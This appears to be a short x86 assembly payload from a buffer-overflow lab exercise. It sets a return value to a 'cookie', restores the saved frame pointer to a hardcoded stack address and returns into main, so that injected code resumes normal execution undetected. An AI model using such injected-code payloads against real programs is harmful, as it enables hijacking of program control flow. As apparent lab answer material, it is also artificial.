pushl $0x08048e81                #return to main
movl  $0x4c6ace54, %eax 	#push cookie to return value
movl  $0x55683c70, %ebp		#push saved ebp to keep stack fresh and relaxed
ret				#FINISH HIM
